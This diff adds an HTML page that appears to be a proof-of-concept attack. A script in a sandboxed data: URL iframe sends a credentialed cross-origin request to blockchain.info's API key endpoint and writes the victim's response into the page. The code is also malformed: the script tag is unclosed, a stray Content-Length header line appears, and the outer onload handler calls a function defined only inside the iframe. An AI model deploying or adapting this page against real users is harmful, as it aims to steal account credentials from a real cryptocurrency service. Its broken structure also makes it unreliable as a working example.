@@ -1,0 +1,28 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>
+function hack()
+{
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.open("GET","https://www.blockchain.info/apikey", false);
+xmlhttp.withCredentials = true;
+xmlhttp.send();
+if(xmlhttp.status==200)
+{
+var str=xmlhttp.responseText;
+document.write(decodeURIComponent(str));
+}
+}
+'>
+</iframe>
+Content-Length: 41
+
+<body onload="hack();">
+</body>
+</html>
